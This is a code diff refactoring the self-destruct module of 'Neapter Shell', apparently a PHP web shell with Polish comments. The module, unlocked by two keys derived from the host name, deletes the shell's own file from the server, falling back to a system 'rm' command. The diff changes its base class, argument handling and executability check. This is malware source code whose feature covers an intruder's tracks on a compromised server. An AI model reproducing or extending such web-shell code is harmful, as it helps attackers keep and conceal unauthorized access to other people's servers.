@@ -4,27 +4,22 @@
  * Neapter Shell
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
 
 /**
- * ModuleDestroy - Trwale usuwanie shella
+ * Trwale usuwanie shella
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Modules
  */
-class ModuleDestroy implements ShellInterface
+class ModuleDestroy extends ModuleAbstract
 {
-	/**
-	 * Obiekt Shell
-	 *
-	 * @access private
-	 * @var    object
-	 */
-	private $oShell;
-
 	/**
 	 * Pierwszy klucz dostepowy
 	 *
@@ -50,7 +45,7 @@ class ModuleDestroy implements ShellInterface
 	 */
 	public function __construct( Shell $oShell )
 	{
-		$this -> oShell = $oShell;
+		parent::__construct( $oShell );
 
 		$this -> sKey = strtoupper( substr( md5( Request::getServer( 'HOST' ) ), 0, 8 ) );
 
@@ -98,7 +93,7 @@ class ModuleDestroy implements ShellInterface
 	}
 
 	/**
-	 * Wywolanie modulu
+	 * Wywalenie w kosmos
 	 *
 	 * @access public
 	 * @return string
@@ -108,14 +103,17 @@ class ModuleDestroy implements ShellInterface
 		/**
 		 * Help
 		 */
-		if( $this -> oShell -> iArgc === 0 )
+		if( $this -> oShell -> getArgs() -> getNumberOfParams() === 0 )
 		{
 			return $this -> getHelp();
 		}
 
-		if( ( $this -> oShell -> aArgv[0] === $this -> sKey ) )
+		$sKey = $this -> oShell -> getargs() -> getParam( 0 );
+		$sFinalKey = $this -> oShell -> getargs() -> getParam( 1 );
+
+		if( ( $sKey === $this -> sKey ) )
 		{
-			if( isset( $this -> oShell -> aArgv[1] ) && ( $this -> oShell -> aArgv[1] === $this -> sFinalKey ) )
+			if( $sFinalKey === $this -> sFinalKey )
 			{
 				$sFilePath = Request::getServer( 'SCRIPT_FILENAME' );
 
@@ -124,7 +122,10 @@ class ModuleDestroy implements ShellInterface
 				 */
 				if( ! unlink( $sFilePath ) )
 				{
-					$this -> oShell -> getCommandSystem( sprintf( 'rm %s', $sFilePath ) );
+					if( $this -> oShell -> isExecutable() )
+					{
+						$this -> oShell -> getCommandSystem( sprintf( 'rm %s', $sFilePath ) );
+					}
 				}
 
 				return sprintf( 'Shell %szostał usunięty', ( ! is_file( $sFilePath ) ? NULL : 'nie ' ) );
